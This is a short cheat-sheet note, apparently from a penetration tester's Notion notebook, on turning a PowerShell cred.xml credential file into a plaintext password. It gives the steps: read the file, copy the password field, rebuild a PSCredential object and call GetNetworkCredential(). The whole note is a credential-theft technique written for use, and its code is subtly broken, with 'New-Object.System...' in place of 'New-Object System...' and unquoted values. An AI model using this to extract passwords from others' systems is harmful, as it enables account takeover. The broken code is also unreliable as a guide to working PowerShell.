# cred.xml: convert password to plaintext

OS: Active_Directory, Windows
Description: cred.xml extract password
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: windows (https://www.notion.so/windows-1454c8e52376809bb701cef01e9f111a?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

- Without cracking password. Just use that sucker.

```jsx
type cred.xml
```

- Copy “password’ field

```jsx
$pass = <long_password_string> | convertto-securestring
$user = domain\username
$cred = New-Object.System.Management.Automation.PSCredential($user,$pass)
$cred.GetNetworkCredential()

```